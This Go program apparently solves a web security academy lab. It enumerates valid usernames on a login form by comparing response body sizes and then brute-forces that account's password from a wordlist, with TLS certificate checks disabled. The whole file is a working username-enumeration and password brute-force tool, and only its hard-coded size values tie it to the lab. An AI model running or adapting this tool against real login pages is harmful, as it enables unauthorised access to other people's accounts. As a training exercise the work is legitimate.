package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func main() {

	// command-line arguments
	var domain string
	flag.StringVar(&domain, "d", "", "target domain")
	var usernames string
	flag.StringVar(&usernames, "u", "", "file containing usernames")
	var passwords string
	flag.StringVar(&passwords, "p", "", "file containing passwords")
	flag.Parse()

	// read in username file
	u, err := ioutil.ReadFile(usernames)
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
	// store usernames in slice
	usernameSlice := strings.Split(string(u), "\n")

	//read in password file
	p, err := ioutil.ReadFile(passwords)
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
	// store passwords in slice
	passwordSlice := strings.Split(string(p), "\n")

	// create request client
	var tr = &http.Transport{
		MaxIdleConns:      30,
		IdleConnTimeout:   time.Second,
		DisableKeepAlives: true,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
	}

	fmt.Println("[Info] An invalid username returns content-length size of 3002. A valid name returns 3004.")
	fmt.Println("[Info] A valid username and password returns content-length of 2937")
	fmt.Println("\n[+] Scanning for valid username...")

	// iterate through usernames and check content-length size
	for _, name := range usernameSlice {
		data := url.Values{
			"username": {name},
			"password": {"invalid-password"},
		}
		// send post request
		resp, err := client.PostForm(domain, data)
		if err != nil {
			log.Fatal(err)
		}
		// read response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		// decode response body into a map
		var res map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&res)
		// get content-length of response
		size := len(body)
		// check for valid username response size
		if size == 3004 {
			validUsername := name
			fmt.Printf("[+] Valid username found: %s\nContent-Length: %v\n", name, size)
			fmt.Println("\n[+] Scanning for valid password...")
			// repeat for password while using valid username
			for _, password := range passwordSlice {
				data = url.Values{
					"username": {validUsername},
					"password": {password},
				}

				resp, err := client.PostForm(domain, data)
				if err != nil {
					log.Fatal(err)
				}
				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					log.Fatal(err)
				}
				var res map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&res)
				size = len(body)
				// content-length is 2937 for valid username/password
				if size == 2937 {
					fmt.Printf("[+] Valid password found: %s\n", password)
					fmt.Println("\nLab Solved. Valid Credentials found!")
					fmt.Printf("Username: %s\nPassword: %s\n", name, password)
					os.Exit(1)
				}
			}
			// if response size is 197, lab url has expired. Need to refresh it
		} else if size == 197 {
			fmt.Println("Web-Academy url has expired. Reload lab and use new url")
			os.Exit(1)
		}
	}
}
